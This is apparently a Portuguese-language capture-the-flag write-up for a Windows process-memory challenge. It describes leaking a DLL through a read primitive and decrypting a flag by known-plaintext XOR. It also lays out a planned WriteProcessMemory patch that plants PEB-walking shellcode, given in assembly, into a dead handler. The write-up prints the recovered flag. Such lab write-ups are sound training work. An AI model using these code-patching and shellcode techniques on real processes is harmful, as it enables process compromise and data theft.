<div align="center">

<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=28&duration=700&pause=1000&color=7EF700&center=true&vCenter=true&repeat=false&width=300&height=35&lines=Second+Chall+by+Binary+Gecko+" alt="Typing SVG" /></a>

<p><img src="/img/hackincariri.webp" alt="Hack in Cariri" height="600"></p>

</div>

# Second Chall by Binary Gecko — PWN · 400 pts · 🟡 MEDIUM

- **Status:** 🟡 EM ABERTO — Flag 1 obtida offline (provavelmente reaproveitada do chall 1); Flag 2 tem vetor WPM projetado e revisado, pronto pra executar, mas não executado.
- **Flag:** `HIK_GECKO2026_CHALLENGE1_96edd2f20231e4e648cbddd5f29e5d88` (Flag 1; Flag 2 = —)
- **Flag format:** `HIK_[texto]_[md5]`
- **Acesso:** `nc <IP> <PORT>` — processo Windows, *low integrity*, reiniciado por um watcher externo a cada ~10 min.
- **Enunciado:** *"Un proceso remoto de Windows, ejecutado con nivel de integridad bajo... Obtén una o ambas flags contenidas en la memoria del proceso, mediante fuga de datos y/o compromiso del proceso."*

---

## 0. TL;DR

1. O host (`gecko2026.exe`) e sua DLL são byte-a-byte idênticos aos do "First Chall by Binary Gecko" — o protocolo e o primitivo de leak/write (`flag=1`/`flag=2`, `ReadProcessMemory`/`WriteProcessMemory` em `base_DLL+counter`) entraram de graça.
2. **Flag 1** sai pelo mesmo caminho do chall 1: leak da DLL inteira + decrypt offline do blob cifrado embutido.
3. O enunciado pede "uma ou ambas" flags, "mediante fuga de datos y/o compromiso del proceso" — sugerindo que a **Flag 2 exige comprometer o processo** (write), já que leitura pura não alcança nenhuma região nova.
4. **Flag 2** projetada via `WriteProcessMemory` (`flag=2`) pra patchar um handler morto (`flag=0`) da própria DLL com shellcode que faz PEB-walk e lê o EXE host (região nunca alcançável só por leitura) — vetor pronto, não executado nesta sessão.

### Cadeia que fechou (Flag 1)
1. Leak completo da imagem da DLL via `flag=1` (`sweep2.py`) -> `module_dump_chall2.bin`
2. Diff byte-a-byte contra o dump do chall 1: código 100% idêntico; só mudam o blob cifrado, a chave XOR embutida e ponteiros ASLR
3. Known-plaintext (`ct[:4] ^ b"HIK_"`) -> chave XOR de 4 bytes -> decrypt do blob de 60 bytes
4. `HIK_GECKO2026_CHALLENGE1_96edd2f20231e4e648cbddd5f29e5d88`

### Cadeia projetada, não executada (Flag 2)
1. `<IBII>(N, flag=2, counter=0x1620, len=82) + wpm_shellcode.bin` -> sobrescreve o slot morto do handler `flag=0`
2. `<IBII>(N, flag=0, counter=OFF, len=0x1000)` varrendo `OFF = 0, 0x1000, ...` sobre o EXE host, mesma conexão
3. Procurar `HIK_`/`FLAG:` em cada resposta

---

## 1. Artefatos

- `gecko2026.exe` — host entregue, byte-a-byte idêntico ao do chall 1.
- `module_dump_chall2.bin` (76 KB) — dump raw da imagem da DLL deste chall, via `sweep2.py` (`flag=1`).
- `exe_live_dump.bin`, `heap_live_dump.bin`, `peb_dump.bin` — dumps auxiliares ao vivo (EXE/heap/PEB).
- `wpm_shellcode.bin` (82B), `sc_absread.bin`, `sc_peb.bin`, `sc_stackscan.bin` — shellcodes montados/verificados com objdump.
- `WPM_PLAN.md` — anexo técnico detalhado do vetor WPM (fatos vs hipótese, shellcode fonte+hex).
- Scripts: `chase_e370.py`, `exploit_v2.py`, `exploit_wpm.py`, `final_scan.py`, `leak2.py`, `rpm_extended.py`, `scan_all.py`, `scan_base.py`, `scan_env.py`, `sweep2.py`.

## 2. Entrega / validação

Não há oráculo externo descrito; ambas flags têm formato `HIK_<texto>_<md5 32 hex>` e são obtidas lendo/escrevendo diretamente a memória do processo (nenhum endpoint de submissão nas notas desta sessão).

## 3. Análise

### 3.1 Protocolo (recap do chall 1 — mesmo binário)
1. Cliente conecta e manda o cookie: `b"Ekoparty 2026 - Binary Gecko CTF challenge"`.
2. Servidor responde o banner de saúde: `b"Welcome to this CTF\x00"` (20B). O host oscila saudável/degradado e tem rate-limit por IP (~65-75s) — se o banner vier tudo-zero, fecha e tenta de novo depois do cooldown.
3. Depois, cada requisição é um header `struct <IBII>` = `N(u32), flag(u8), counter(u32), len(u32)` seguido de `data[]`:
   - `flag=1` → `ReadProcessMemory(self, base_DLL + counter, &resp, len)` — leak por offset.
   - `flag=2` → `WriteProcessMemory(self, base_DLL + counter, data, len)` — write arbitrário.
   - `counter` é u32, forward-only a partir da base da DLL; `len ≤ 0x1000`.
4. A base da DLL (ASLR, page-aligned `...0000`) é recuperável em runtime: há um self-ptr em `base+0xd068` que aponta pra string `"FLAG:"` em `base+0xd020` → `base = (ptr@0xd068) - 0xd020`.

### 3.2 Flag 1 — decrypt offline do blob da DLL
`module_dump_chall2.bin` é o dump raw da imagem da DLL (`0x0..0x13000`), coletado via `sweep2.py` (`flag=1`, varrendo offset por offset). Diff byte-a-byte contra o dump do chall 1: código 100% idêntico; só mudam o blob cifrado (`0xd026..0xd060`), a chave XOR de 4B embutida (`0xe368`) e ponteiros ASLR.

A DLL carrega a flag cifrada e tem o decryptor embutido, mas ele nunca é chamado no fluxo normal — então o decrypt é feito manualmente, com known-plaintext (o texto começa com `HIK_`):

```python
d  = open("module_dump_chall2.bin","rb").read()
ct = d[0xd026:0xd026+60]
key = bytes(c ^ p for c, p in zip(ct[:4], b"HIK_"))     # chave de 4B (XOR é involutivo)
flag = bytes(ct[i] ^ key[i % 4] for i in range(60))
# -> HIK_GECKO2026_CHALLENGE1_96edd2f20231e4e648cbddd5f29e5d88
```

**Flag 1:** `HIK_GECKO2026_CHALLENGE1_96edd2f20231e4e648cbddd5f29e5d88`

⚠️ **Ressalva:** o texto é `GECKO2026_CHALLENGE1` e o MD5 saiu idêntico ao do chall 1 — é a mesma flag reaproveitada (host idêntico, só muda a seed por boot, mas o plaintext é o mesmo). Pelo enunciado ("una o ambas"), conta como uma das duas, mas provavelmente não é a flag exclusiva do chall 2. Não confirmado na plataforma se já pontuou; se sim, o que vale é a Flag 2.

### 3.3 Flag 2 — por que leitura pura não alcança
Mapeamento do que o primitivo `flag=1` consegue tocar (lê `base_DLL + counter`, `counter` u32 forward-only):

| Região | Alcançável por `flag=1`? |
|---|---|
| Imagem da DLL (`0..0x13000`) | ✅ já dumpada — só tem a Flag 1 |
| Página logo após (`0x13000`) | ❌ não-mapeada (confirmado ao vivo) |
| Heap / stack / EXE host | ❌ ficam abaixo da base da DLL (`0x7ffa...`); counter só anda pra frente |
| Outras DLLs | tecnicamente à frente, mas é código de lib + endereços mudam por ASLR a cada boot |

Varredura dos 3237 ponteiros do dump: 3019 apontam pra baixo da base (heap/EXE — inalcançáveis) e os 68 alcançáveis pra frente são todos IAT→DLL vizinha. Nenhum leva à Flag 2. Conclusão: a Flag 2 não sai por leitura — bate com o enunciado (*low integrity* + *compromiso del proceso*): precisa de `WriteProcessMemory`.

### 3.4 Flag 2 — vetor de compromisso (WPM / `flag=2`)
**Ideia:** a escrita `flag=2` também é `base_DLL + counter` forward, e `counter` pequeno (`0..0x13000`) cai dentro da imagem RX da própria DLL. `WriteProcessMemory` ignora proteção de página → dá pra patchar o `.text` da DLL. Plano: plantar shellcode e executá-lo abusando de um handler morto.

Fatos (confirmados por disassembly estático de `gecko2026.exe` + dump):
- **Dispatch table** em `base+0xe340`: 3 handlers — `0x1620`(flag0), `0x1690`(flag1/RPM), `0x1730`(flag2/WPM). O byte `flag` indexa a tabela.
- **`flag=0` é dead code pós-boot:** é um guard *one-shot* (`if DAT_e36c==1 {...; DAT_e36c=0}`) consumido no startup pelo próprio EXE. Depois, no-op. O slot `base+0x1620..0x1690` (112B, inclui padding `0xCC`) é seguro de sobrescrever sem tocar os handlers de RPM/WPM que as outras equipes usam.
- Offsets fixos relativos à base: RPM IAT `0xa028`, dispatch table `0xe340`, slot `0x1620`.

**Shellcode (82B — `wpm_shellcode.bin`, montado e verificado com objdump):** faz PEB-walk até o primeiro módulo carregado (= o EXE host), soma `counter`, e chama o `ReadProcessMemory` real (via IAT) pra ler `exe_base + counter` no buffer de resposta. Depois de plantado, `flag=0` vira um "RPM a partir do EXE" — exatamente a região que o leak original (base da DLL) nunca cobriu.

```asm
sub rsp, 0x38
mov r11, rcx              ; rcx = &hdr (struct <IBII>+data na pilha do handler)
mov edx, [r11+5]          ; edx = hdr.counter
mov rax, [gs:0x30]        ; TEB
mov rax, [rax+0x60]       ; PEB
mov rax, [rax+0x18]       ; PEB_LDR_DATA
mov rax, [rax+0x10]       ; InLoadOrderModuleList.Flink -> 1a entry (= EXE)
mov rax, [rax+0x30]       ; DllBase do EXE
add rax, rdx              ; exe_base + counter
mov rdx, rax              ; lpBaseAddress
lea r8,  [r11+0xd]        ; lpBuffer = hdr.data (buffer que o EXE devolve)
mov r9d, [r11+9]          ; nSize = hdr.len
mov rcx, -1               ; hProcess = pseudo-handle (processo atual)
mov qword [rsp+0x20], 0   ; lpNumberOfBytesRead = NULL
call qword [rip+0x89c0]   ; = call [base+0xa028] = *ReadProcessMemory  (só vale se plantado em 0x1620)
mov eax, 1                ; sempre reporta sucesso -> mantém a conexão viva pra encadear o sweep
add rsp, 0x38
ret
```

> `call [rip+0x89c0]` só resolve pra `base+0xa028` **se** plantado em `base+0x1620`. Em outro offset: `disp = 0xa028 - (destino + 0x48)`.

**Plano de execução (1 conexão):**
1. Cookie → exigir banner saudável (retry se degradado).
2. **PATCH:** `<IBII>(N, flag=2, counter=0x1620, len=82) + wpm_shellcode.bin` → sobrescreve o slot morto.
3. **TRIGGER + SWEEP** (mesma conexão): vários `<IBII>(N, flag=0, counter=OFF, len=0x1000)` com `OFF = 0, 0x1000, 0x2000, ...` varrendo o EXE pra frente; procurar `HIK_`/`FLAG:` em cada resposta.
4. Se nada em alguns MB → parar (não escalar sozinho pra shellcode v2 com heap-walk sem novo OK).

### 3.5 Riscos (processo compartilhado)
- O patch muda o comportamento de `flag=0` pra todas as equipes até o restart (~10 min). Não crasha (RPM falha "limpo", shellcode sempre retorna 1), mas é uma alteração visível do protocolo.
- Premissa "`flag=0` é dead code" é de leitura pontual, não exaustiva → risco baixo, não zero.
- Sem desfazer pela rede — só o restart de 10 min restaura o binário.
- 1 conexão cobre patch+sweep; se o patch falhar, a conexão cai e espera o cooldown (~65-75s).

## 4. O que não funcionou

| Hipótese | Resultado | Por quê |
|---|---|---|
| Alcançar a Flag 2 só com leitura (`flag=1`) | ✗ | Todos os ponteiros alcançáveis forward levam só a código de DLL vizinha (IAT); heap/stack/EXE ficam abaixo da base e `counter` só anda pra frente. |

## 5. Conclusão / próximos passos

Flag 1 fechou por leak+decrypt offline (mesmo mecanismo do chall 1, possivelmente flag reaproveitada). Flag 2 ficou travada: o vetor de `WriteProcessMemory` para patchar o handler morto (`flag=0`) e usá-lo como leitor do EXE host está **totalmente projetado, revisado e com shellcode montado e verificado**, mas não foi executado nesta sessão (risco de afetar o processo compartilhado entre equipes sem confirmação final). Próximo passo: executar o plano da §3.4 numa única conexão (patch + trigger + sweep) e, se nada aparecer em alguns MB do EXE, parar — não escalar para um shellcode v2 com heap-walk sem validação adicional.

---

## Apêndice — ferramentas

- `sweep2.py` — leak completo da imagem da DLL (`flag=1`), gerou `module_dump_chall2.bin`.
- `rpm_extended.py` — leak estendido `flag=1` (read-only); provou que `0x13000+` é não-mapeado.
- `exploit_wpm.py` — script de disparo do vetor WPM (patch do slot `flag=0` + sweep do EXE).
- `chase_e370.py`, `final_scan.py`, `leak2.py`, `scan_all.py`, `scan_base.py`, `scan_env.py`, `exploit_v2.py` — scripts auxiliares de reconhecimento/scan de memória usados ao longo da sessão.
